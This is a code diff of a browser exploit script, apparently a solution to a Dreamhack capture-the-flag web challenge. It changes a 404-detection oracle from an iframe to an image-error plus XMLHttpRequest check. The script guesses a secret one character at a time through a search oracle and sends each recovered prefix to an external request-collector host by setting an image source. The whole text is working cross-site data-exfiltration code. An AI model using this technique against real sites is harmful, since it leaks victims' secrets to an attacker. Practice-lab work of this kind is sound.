@@ -3,20 +3,28 @@
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-                const iframeContent = iframeDocument.body.innerText;
 
-                if (iframeContent.includes("404")) {
-                    // "404"가 포함되어 있으면 reject()
-                    return reject();
-                } else {
-                    // "404"가 포함되어 있지 않으면 resolve()
-                    return resolve();
-                }
-            }; 
+            var img = document.getElementById('img');
+
+            img.addEventListener('error', function() {
+                var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 404) {
+                            console.log('Image not found (404 Not Found)');
+                            // 여기에서 404 오류를 처리하거나 필요한 작업을 수행할 수 있습니다.
+                            return reject();
+                        } else {
+                            console.log('Other error:', xhr.status);
+                            // 다른 종류의 오류를 처리할 수도 있습니다.
+                            return resolve();
+                        }
+                    }
+                };
+
+                xhr.open('GET', img.src, true);
+                xhr.send();
+            });            
         });
     }
     async function search(query) {
@@ -36,7 +44,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://brzhkrf.request.dreamhack.games/${secret}`;
+                    img.src = `https://ffhxdeq.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
